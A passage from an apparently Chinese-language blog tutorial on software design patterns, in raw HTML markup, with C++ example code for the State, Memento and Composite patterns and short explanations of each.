class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkProcessor</span>&#123;</span><br>    NetworkState state;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Operation</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (state == Network_Open)&#123;<br>            ...<br>            state = Network_Close;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (state == Network_Close)&#123;<br>...<br>            state = Network_Connect;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (state == Network_Connect)&#123;<br>...<br>            state = Network_Open;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>实现二，抽象出状态对象，状态对象自己处理自己的转换关系。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 状态对象基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkState</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    NetworkState* pNext;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Operation1</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Operation2</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Operation3</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">virtual</span> ~NetworkState()&#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 具体状态对象，可设计为Singleton</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OpenState</span> :</span><span class="hljs-keyword">public</span> NetworkState&#123;<br>    <span class="hljs-keyword">static</span> NetworkState* m_instance;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> NetworkState* <span class="hljs-title">getInstance</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (m_instance == <span class="hljs-literal">nullptr</span>) &#123;<br>            m_instance = <span class="hljs-keyword">new</span> OpenState();<br>        &#125;<br>        <span class="hljs-keyword">return</span> m_instance;<br>    &#125;<br><br>    <span class="hljs-comment">// 改变 pNext 指针，抽象转换对象状态。</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Operation1</span><span class="hljs-params">()</span></span>&#123;<br>...<br>        pNext = CloseState::getInstance();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Operation2</span><span class="hljs-params">()</span></span>&#123;<br>        ...<br>        pNext = ConnectState::getInstance();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Operation3</span><span class="hljs-params">()</span></span>&#123;<br>...<br>        pNext = OpenState::getInstance();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">// 更多的具体状态对象，可扩展</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CloseState</span>:</span><span class="hljs-keyword">public</span> NetworkState&#123; ... &#125;<br><br>...<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 应用类，稳定，一般可保持不变</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NetworkProcessor</span>&#123;</span><br>    NetworkState* pState;<br>    <br><span class="hljs-keyword">public</span>:<br>    NetworkProcessor(NetworkState* pState)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;pState = pState;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 通过 状态对象 处理状态转换</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Operation1</span><span class="hljs-params">()</span></span>&#123;<br>        pState-&gt;Operation1();<br>        pState = pState-&gt;pNext;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Operation2</span><span class="hljs-params">()</span></span>&#123;<br>        pState-&gt;Operation2();<br>        pState = pState-&gt;pNext;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Operation3</span><span class="hljs-params">()</span></span>&#123;<br>        pState-&gt;Operation3();<br>        pState = pState-&gt;pNext;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>State模式将状态的改变，实现为状态对象的改变，通过抽象基类，不再依赖具体对象。而且，状态的转换更加明确，不易出错。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/16-02-27-5e7c3e.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * State</span><br><span class="hljs-comment"> * defines an interface for encapsulating the behavior associated</span><br><span class="hljs-comment"> * with a particular state of the Context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">State</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~State() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handle</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete States</span><br><span class="hljs-comment"> * each subclass implements a behavior associated with a state</span><br><span class="hljs-comment"> * of the Context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteStateA</span> :</span> <span class="hljs-keyword">public</span> State<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteStateA() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"State A handled."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteStateB</span> :</span> <span class="hljs-keyword">public</span> State<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteStateB() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"State B handled."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Context</span><br><span class="hljs-comment"> * defines the interface of interest to clients</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Context</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  Context() : state() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  ~Context()<br>  &#123;<br>    <span class="hljs-keyword">delete</span> state;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setState</span><span class="hljs-params">( State* <span class="hljs-keyword">const</span> s )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( state )<br>    &#123;<br>      <span class="hljs-keyword">delete</span> state;<br>    &#125;<br>    state = s;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    state-&gt;handle();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  State *state;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Context *context = <span class="hljs-keyword">new</span> Context();<br>  <br>  context-&gt;setState( <span class="hljs-keyword">new</span> ConcreteStateA() );<br>  context-&gt;request();<br>  <br>  context-&gt;setState( <span class="hljs-keyword">new</span> ConcreteStateB() );<br>  context-&gt;request();<br>  <br>  <span class="hljs-keyword">delete</span> context;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="memento">Memento</span></h3><p>当一个对象，需要保存一个或者多个内存快照，用于未来恢复到当前对象状态。这时，会出现一个潜在问题，对象的实现细节可能会暴露。</p><p>Memento的想法，就是找另一个封闭的对象B，保存当前对象A的状态，并在需要的时候用于恢复对象A的状态。</p><p>Memento在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。这样以后就可将该对象恢复到原先保存的状态。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/16-20-18-2d5ee6.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>这个模式就是为了隐藏对象信息，而不是显示地将一个一个成员变量导出保存。</p><p>但是，这个模式实现地内存快照方法，已经过时了，现在往往会采用效率更高、更简洁地序列化方法来实现。</p><h4><span id="抽象代码实现">抽象代码实现</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Memento</span><br><span class="hljs-comment"> * stores internal state of the Originator object and protects</span><br><span class="hljs-comment"> * against access by objects other than the originator</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memento</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-comment">// accessible only to Originator</span><br>  <span class="hljs-keyword">friend</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Originator</span>;</span><br>  <br>  Memento( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> s ) : state( s ) &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setState</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> s )</span></span><br><span class="hljs-function">  </span>&#123;<br>    state = s;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getState</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> state;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> state;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Originator</span><br><span class="hljs-comment"> * creates a memento containing a snapshot of its current internal</span><br><span class="hljs-comment"> * state and uses the memento to restore its internal state</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Originator</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">// implemented only for printing purpose</span><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setState</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> s )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Set state to "</span> &lt;&lt; s &lt;&lt; <span class="hljs-string">"."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    state = s;<br>  &#125;<br>  <br>  <span class="hljs-comment">// implemented only for printing purpose</span><br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getState</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> state;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setMemento</span><span class="hljs-params">( Memento* <span class="hljs-keyword">const</span> m )</span></span><br><span class="hljs-function">  </span>&#123;<br>    state = m-&gt;getState();<br>  &#125;<br>  <br>  <span class="hljs-function">Memento *<span class="hljs-title">createMemento</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Memento( state );<br>  &#125;<br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> state;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * CareTaker</span><br><span class="hljs-comment"> * is responsible for the memento's safe keeping</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CareTaker</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  CareTaker( Originator* <span class="hljs-keyword">const</span> o ) : originator( o ) &#123;&#125;<br>  <br>  ~CareTaker()<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; history.<span class="hljs-built_in">size</span>(); i++ )<br>    &#123;<br>      <span class="hljs-keyword">delete</span> history.at( i );<br>    &#125;<br>    history.<span class="hljs-built_in">clear</span>();<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Save state."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    history.push_back( originator-&gt;createMemento() );<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">undo</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( history.empty() )<br>    &#123;<br>      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Unable to undo state."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    Memento *m = history.back();<br>    originator-&gt;setMemento( m );<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Undo state."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    <br>    history.pop_back();<br>    <span class="hljs-keyword">delete</span> m;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Originator *originator;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Memento*&gt; history;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Originator *originator = <span class="hljs-keyword">new</span> Originator();<br>  CareTaker *caretaker = <span class="hljs-keyword">new</span> CareTaker( originator );<br>  <br>  originator-&gt;setState( <span class="hljs-number">1</span> );<br>  caretaker-&gt;save();<br>  <br>  originator-&gt;setState( <span class="hljs-number">2</span> );<br>  caretaker-&gt;save();<br>  <br>  originator-&gt;setState( <span class="hljs-number">3</span> );<br>  caretaker-&gt;undo();<br>  <br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Actual state is "</span> &lt;&lt; originator-&gt;getState() &lt;&lt; <span class="hljs-string">"."</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  <span class="hljs-keyword">delete</span> originator;<br>  <span class="hljs-keyword">delete</span> caretaker;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="数据结构相关模式">数据结构相关模式</span></h2><p>假如存在一些数据结构，如果让客户程序直接依赖它们，会破坏组件的复用性。比如说接口的不统一，导致源代码需要频繁改变。</p><p>这时候，对这些数据结构进行封装，对外提供统一的接口，来实现与数据结构无关的访问。</p><p>典型模式：</p><ol type="1"><li>Composite</li><li>Iterator</li><li>Chain of Responsibility</li></ol><h3><span id="composite">Composite</span></h3><p>处理对内部数据结构复杂实现的依赖，Composite将对象组合成树形结构以表示“部分-整体”的层次结构。Composite使得用户对单个对象和组合对象的使用具有一致性。</p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Component</span><br><span class="hljs-comment"> * defines an interface for all objects in the composition</span><br><span class="hljs-comment"> * both the composite and the leaf nodes</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Component</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Component() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Component *<span class="hljs-title">getChild</span><span class="hljs-params">( <span class="hljs-keyword">int</span> )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">( Component * )</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">( <span class="hljs-keyword">int</span> )</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Composite</span><br><span class="hljs-comment"> * defines behavior of the components having children</span><br><span class="hljs-comment"> * and store child components</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Composite</span> :</span> <span class="hljs-keyword">public</span> Component<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~Composite()<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; children.<span class="hljs-built_in">size</span>(); i++ )<br>    &#123;<br>      <span class="hljs-keyword">delete</span> children[ i ];<br>    &#125;<br>  &#125;<br> 